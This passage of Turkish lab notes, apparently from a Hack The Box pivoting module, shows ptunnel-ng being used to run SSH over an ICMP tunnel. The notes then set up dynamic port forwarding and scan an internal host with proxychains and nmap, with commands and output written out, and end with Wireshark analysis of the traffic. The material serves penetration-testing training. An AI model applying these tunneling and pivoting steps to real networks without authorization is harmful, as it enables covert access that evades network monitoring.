M1R4CKCK@htb[/htb]$ sudo apt install automake autoconf -y
M1R4CKCK@htb[/htb]$ cd ptunnel-ng/
M1R4CKCK@htb[/htb]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
M1R4CKCK@htb[/htb]$ ./autogen.sh
```


### Ptunnel-ng'in Pivot Host'a Aktarılması

```shell-session
M1R4CKCK@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

Hedef hostta ptunnel-ng ile, doğrudan aşağıdaki komutu kullanarak ICMP tünelinin sunucu tarafını başlatabiliriz.


### Hedef Hostta ptunnel-ng Sunucusunu Başlatma
```shell-session
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

-r'den sonraki IP adresi ptunnel-ng'nin bağlantıları kabul etmesini istediğimiz IP olmalıdır. Bu durumda, saldırı hostumuzdan erişilebilen IP ne olursa olsun kullanacağımız IP olacaktır. Aynı düşünce ve değerlendirmeyi gerçek bir etkileşim sırasında da kullanmamız faydalı olacaktır.

Saldırı hostuna geri döndüğümüzde, ptunnel-ng sunucusuna bağlanmayı deneyebiliriz (-p <ipAddressofTarget<) ancak bunun yerel port 2222 (-l2222) üzerinden gerçekleştiğinden emin olun. Lokal port 2222 üzerinden bağlanmak ICMP tüneli üzerinden trafik göndermemizi sağlar.



### Saldırı Hostundan ptunnel-ng Sunucusuna Bağlanma
```shell-session
M1R4CKCK@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

ptunnel-ng ICMP tüneli başarıyla kurulduktan sonra, lokal port 2222 (-p2222) üzerinden SSH kullanarak hedefe bağlanmayı deneyebiliriz.


### SSH bağlantısını bir ICMP Tüneli üzerinden tünelleme
```shell-session
M1R4CKCK@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 11 May 2022 03:10:15 PM UTC

  System load:             0.0
  Usage of /:              39.6% of 13.72GB
  Memory usage:            37%
  Swap usage:              0%
  Processes:               183
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

144 updates can be applied immediately.
97 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May 11 14:53:22 2022 from 10.10.14.18
ubuntu@WEB01:~$ 
```
Doğru yapılandırılırsa, kimlik bilgilerini girebilir ve ICMP tüneli üzerinden bir SSH oturumu açabiliriz.

Bağlantının istemci ve sunucu tarafında, ptunnel-ng'nin bize ICMP tünelinden geçen trafikle ilgili oturum günlükleri ve trafik istatistikleri verdiğini fark edeceğiz. Bu, trafiğimizin ICMP kullanarak client'tan server'a geçtiğini doğrulayabilmemizin bir yoludur.


### Tünel Trafiği İstatistiklerini Görüntüleme
```shell-session
inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]: 
```
Ayrıca bu tüneli ve SSH'yi, proxy zincirlerini çeşitli şekillerde kullanmamıza olanak tanıyan dinamik port yönlendirme gerçekleştirmek için de kullanabiliriz.


### SSH Üzerinden Dinamik Port Yönlendirmeyi Etkinleştirme
```shell-session
M1R4CKCK@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```
İç ağdaki (172.16.5.x) hedefleri taramak için Nmap ile proxyychains kullanabiliriz. Keşiflerimize dayanarak, hedefe bağlanmayı deneyebiliriz.



### ICMP Tüneli Üzerinden Proxy Zincirleme
```shell-session
M1R4CKCK@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```


### Ağ Trafiği Analizinde Dikkat Edilmesi Gerekenler
Kullandığımız araçların söylendiği gibi çalıştığını ve bunları doğru şekilde kurup çalıştırdığımızı teyit etmemiz önemlidir. Bu bölümde ICMP tünelleme ile öğretilen farklı protokoller aracılığıyla trafiği tünelleme durumunda, Wireshark gibi bir paket analizörü ile oluşturduğumuz trafiği analiz etmekten yararlanabiliriz. Aşağıdaki kısa klibe yakından bakın.
![Pasted image 20241008122050.png](/img/user/resimler/Pasted%20image%2020241008122050.png)

![Pasted image 20241008122110.png](/img/user/resimler/Pasted%20image%2020241008122110.png)

Bu videonun ilk bölümünde ICMP tünelleme kullanılmadan SSH üzerinden bir bağlantı kuruluyor. TCP & SSHv2 trafiğinin yakalandığını fark edebiliriz.

Klipte kullanılan komut: ssh ubuntu@10.129.202.64

Bu klibin ikinci bölümünde, ICMP tünelleme kullanılarak SSH üzerinden bir bağlantı kuruluyor. Bu gerçekleştirilirken yakalanan trafik türüne dikkat edin.

Klipte kullanılan komut: ssh -p2222 -lubuntu 127.0.0.1